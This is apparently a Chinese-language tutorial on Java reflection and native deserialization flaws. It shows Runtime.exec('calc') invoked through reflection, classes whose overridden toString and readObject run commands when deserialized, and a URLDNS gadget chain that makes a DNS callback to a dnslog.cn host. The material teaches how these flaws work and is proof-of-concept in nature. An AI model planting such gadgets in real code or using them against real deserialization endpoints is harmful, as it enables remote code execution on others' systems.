<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取名为 &quot;exec&quot; 的方法，该方法接受一个 String 参数</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取名为 &quot;getRuntime&quot; 的方法，该方法不接受参数</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用反射调用 aClass 对象的 getRuntime 方法，获取 Runtime 对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(aClass);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用反射调用 Runtime 对象的 exec 方法，执行系统命令 &quot;calc.exe&quot;</span></span><br><span class="line">exec.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 Class.forName 获取 Runtime 类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Runtime 类的默认构造方法</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> c1.getDeclaredConstructor();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置构造方法为可访问</span></span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用反射调用 Runtime 类的 exec 方法，执行系统命令 &quot;calc&quot;</span></span><br><span class="line">c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2、不安全的反射对象<br>指应用程序使用具有反射功能的外部输入来选择要使用的类或代码，<br>可能被攻击者利用而输入或选择不正确的类。绕过身份验证或访问控制检查<br>参考分析：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/165273855">https://zhuanlan.zhihu.com/p/165273855</a><br>利用结合：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7031?time__1311=n4+xnD0GDti=LxQTq05+bDyGD9lBQKDReOYD">https://xz.aliyun.com/t/7031?time__1311=n4%2BxnD0GDti%3DLxQTq05%2BbDyGD9lBQKDReOYD</a></p>
<h1 id="JavaEE应用-原生反序列化-重写方法-链条分析-触发类-类加载"><a href="#JavaEE应用-原生反序列化-重写方法-链条分析-触发类-类加载" class="headerlink" title="JavaEE应用&amp;原生反序列化&amp;重写方法&amp;链条分析&amp;触发类&amp;类加载"></a>JavaEE应用&amp;原生反序列化&amp;重写方法&amp;链条分析&amp;触发类&amp;类加载</h1><h2 id="反序列化-解释-使用-安全"><a href="#反序列化-解释-使用-安全" class="headerlink" title="反序列化-解释&amp;使用&amp;安全"></a><strong>反序列化-解释&amp;使用&amp;安全</strong></h2><h3 id="序列化-反序列化-概念"><a href="#序列化-反序列化-概念" class="headerlink" title="序列化&amp;反序列化-概念"></a>序列化&amp;反序列化-概念</h3><p><img src="/img/xiaodi/df80505b1fc8e37506461b2a151f96d6.jpeg" alt="3_xuliehua.jpg"></p>
<h4 id="1、序列化与反序列化"><a href="#1、序列化与反序列化" class="headerlink" title="1、序列化与反序列化"></a>1、序列化与反序列化</h4><p>序列化：将内存中的对象转换成便于传输的字节流</p>
<p>反序列化：将字节流转化成内存中的对象</p>
<p>Java 提供了一种对象<strong>序列化</strong>的机制。用一个字节序列可以表示一个对象，&#x3D;&#x3D;<strong>该字节序列包含该<code>对象的数据</code>、<code>对象的类型</code>和<code>对象中存储的属性</code>等信息。</strong>&#x3D;&#x3D;字节序列写出到文件之后，相当于文件中<strong>持久保存</strong>了一个对象的信息。</p>
<p><strong>反之，该字节序列还可以从文件中读取回来，重构对象，对它进行反序列化</strong></p>
<h4 id="2、序列化技术"><a href="#2、序列化技术" class="headerlink" title="2、序列化技术"></a>2、序列化技术</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">序列化与反序列化的设计就是用来传输数据的。</span><br><span class="line">当两个进程进行通信的时候，可以通过序列化反序列化来进行传输。</span><br><span class="line">能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。</span><br><span class="line">应用场景</span><br><span class="line">(<span class="number">1</span>) 想把内存中的对象保存到一个文件中或者是数据库当中。</span><br><span class="line">(<span class="number">2</span>) 用套接字在网络上传输对象。</span><br><span class="line">(<span class="number">3</span>) 通过RMI传输对象的时候。</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h4 id="3、常见的序列化和反序列化协议"><a href="#3、常见的序列化和反序列化协议" class="headerlink" title="3、常见的序列化和反序列化协议"></a>3、常见的序列化和反序列化协议</h4><p>• JAVA内置的writeObject()&#x2F;readObject()<br>• JAVA内置的XMLDecoder()&#x2F;XMLEncoder<br>• XStream<br>• SnakeYaml<br>• FastJson<br>• Jackson</p>
<h4 id="4、为什么会出现反序列化安全问题"><a href="#4、为什么会出现反序列化安全问题" class="headerlink" title="4、为什么会出现反序列化安全问题"></a>4、为什么会出现反序列化安全问题</h4><p>内置原生写法分析<br>• 重写readObject方法<br>• 输出调用toString方法</p>
<h4 id="5、反序列化利用链"><a href="#5、反序列化利用链" class="headerlink" title="5、反序列化利用链"></a>5、反序列化利用链</h4><p>(1) 入口类的readObject直接调用危险方法<br>(2) 入口参数中包含可控类，该类有危险方法，readObject时调用<br>(3) 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用<br>(4) 构造函数&#x2F;静态代码块等类加载时隐式执行</p>
<h3 id="原生使用-序列化-反序列化"><a href="#原生使用-序列化-反序列化" class="headerlink" title="原生使用-序列化&amp;反序列化"></a>原生使用-序列化&amp;反序列化</h3><p><img src="/img/xiaodi/a9e50e21b34462cbe60b4ccac98c27b0.png" alt="请添加图片描述"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[<span class="comment">//进行序列化对象并写入文件ser.txt](https://xn--ser-tu9d84i5il4ak2d9y9a9vf0hw87e4j7he7ljvm.txt/)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeTest</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//读入Filename进行反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserializeTest</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line"><span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.序列化实现，创建用户类，并实现<strong>Serializable</strong>接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDemo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//公共成员变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;xiaodi&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> <span class="string">&quot;man&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">Integer</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserDemo</span><span class="params">(String name, String gender, Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        System.out.println(gender);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回对象信息的字符串表示</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>2.创建对应的序列化类，并创建对应的序列化方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializableDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//创建一个用户对象，引用UserDemo</span></span><br><span class="line">        <span class="type">UserDemo</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserDemo</span>(<span class="string">&quot;xiaodi&quot;</span>, <span class="string">&quot;gay1&quot;</span>, <span class="number">30</span>);</span><br><span class="line">        <span class="comment">//调用方法进行序列化</span></span><br><span class="line">        SerializableTest(u);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//序列化方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SerializableTest</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//使用 ObjectOutputStream将对象 obj 序列化后输出到文件ser.txt</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关闭流</span></span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<p>3.创建对应反序列化类，并创建对应反序列化方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializableDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//调用下面的方法，传输 ser.txt，解析还原反序列化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> UnserializableTest(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对 obj 对象进行输出。默认调用原始对象的 toString 方法</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">UnserializableTest</span><span class="params">(String file)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 读取 Filename 文件进行反序列化还原</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回反序列化后的对象</span></span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>执行结果：</p>
<p><img src="/img/xiaodi/image-20250521194859694.png" alt="image-20250521194859694"></p>
<h3 id="安全问题-重写方法-触发方法"><a href="#安全问题-重写方法-触发方法" class="headerlink" title="安全问题-重写方法&amp;触发方法"></a>安全问题-重写方法&amp;触发方法</h3><blockquote>
<ul>
<li>toString &#x2F;&#x2F;输出调用toString方法</li>
<li>如果在<code>原始对象</code> 的toString方法中夹带外部执行命令，可能在执行反序列化时</li>
<li>触发方式：如果对obj对象进行输出 <strong>默认调用原始对象的toString方法 而造成执行外部命令</strong></li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        **<span class="comment">// 潜在的安全问题：执行外部命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);**</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// 潜在的安全问题：将异常信息抛出，可能泄漏敏感信息</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">            <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//调用下面的方法 传输ser.txt 解析还原反序列化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span>UnserializableTest(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line">        <span class="comment">//对obj对象进行输出 默认调用原始对象的toString方法</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">UnserializableTest</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//读取Filename文件进行反序列化还原</span></span><br><span class="line">        ObjectInputStream ois= <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/img/xiaodi/image-20250521194859694.png" alt="image-20250521194859694"></p>
<blockquote>
<ul>
<li>readObject &#x2F;&#x2F;序列化后被重写readObject调用</li>
<li>触发方式：在原始对象中重写readObject 方法，在执行反序列化时候，会被默认优先调用</li>
</ul>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/bdf90ec03c8e19c8360cb8afd0e44545.png" alt="Untitled"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 私有的 readObject 方法，用于在反序列化时执行一些自定义的逻辑</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 指向正确的 readObject</span></span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="comment">// 调用 Runtime.getRuntime().exec(&quot;calc&quot;) 执行系统命令 &quot;calc&quot;，潜在的安全风险</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="安全问题-可控其他类重写方法"><a href="#安全问题-可控其他类重写方法" class="headerlink" title="安全问题-可控其他类重写方法"></a>安全问题-可控其他<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E7%B1%BB%E9%87%8D%E5%86%99&spm=1001.2101.3001.7020">类重写</a>方法</h3><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>
<h4 id="1-利用-HashMap存在的反序列化漏洞的readObject方法，调用了HashMap-putVal-方法，最终调用了URL-hashCode-形成RCE漏洞分析"><a href="#1-利用-HashMap存在的反序列化漏洞的readObject方法，调用了HashMap-putVal-方法，最终调用了URL-hashCode-形成RCE漏洞分析" class="headerlink" title="1.利用 HashMap存在的反序列化漏洞的readObject方法，调用了HashMap.putVal() 方法，最终调用了URL.hashCode()形成RCE漏洞分析"></a>1.利用 <strong><code>HashMap</code>存在的反序列化漏洞的<code>readObject</code>方法，调用了<code>HashMap.putVal()</code> 方法，最终调用了<code>URL.hashCode()形成</code>RCE漏洞分析</strong></h4><ul>
<li><p>正常代码中 创建对象HashMap</p>
</li>
<li><p>用到原生态readObject方法去反序列化数据</p>
<ul>
<li>readObject 在ObjectInputSteam 本来在这里</li>
<li>HashMap也有readObject方法</li>
</ul>
</li>
<li><p>反序列化readObject方法调用 HashMap里面的readObject<br>执行链：<br>序列化对象hash 来源于自带类HashMap</p>
</li>
<li><p>Gadget Chain:</p>
<ul>
<li>HashMap.readObject()</li>
<li>HashMap.putVal()</li>
<li>HashMap.hash()</li>
<li>URL.hashCode()</li>
</ul>
</li>
<li><p>hashCode 执行结果 触发访问DNS请求 如果这里是执行命令的话 就是RCE漏洞</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDns</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//正常代码中 创建对象HashMap</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用到原生态readObject方法去反序列化数据</span></span><br><span class="line">        <span class="comment">//readObject 在ObjectInputSteam 本来在这里</span></span><br><span class="line">        <span class="comment">//HashMap也有readObject方法</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化readObject方法调用 HashMap里面的readObject</span></span><br><span class="line">        <span class="comment">//执行链：</span></span><br><span class="line">        <span class="comment">//序列化对象hash 来源于自带类HashMap</span></span><br><span class="line"><span class="comment">//         *   Gadget Chain:</span></span><br><span class="line"><span class="comment">//                *   HashMap.readObject()</span></span><br><span class="line"><span class="comment">//                *       HashMap.putVal()</span></span><br><span class="line"><span class="comment">//                *         HashMap.hash()</span></span><br><span class="line"><span class="comment">//                *           URL.hashCode()</span></span><br><span class="line">        <span class="comment">//hashCode 执行结果 触发访问DNS请求 如果这里是执行命令的话 就是RCE漏洞</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hash = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        URL u=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://6grm3c.dnslog.cn&quot;</span>);</span><br><span class="line">        hash.put(u,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        SerializableTest(hash);</span><br><span class="line">        UnserializableTest(<span class="string">&quot;dns.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SerializableTest</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//FileOutputStream() 输出文件</span></span><br><span class="line">        <span class="comment">//将对象obj序列化后输出到文件ser.txt</span></span><br><span class="line">        ObjectOutputStream oos= <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;dns.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">UnserializableTest</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//读取Filename文件进行反序列化还原</span></span><br><span class="line">        ObjectInputStream ois= <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



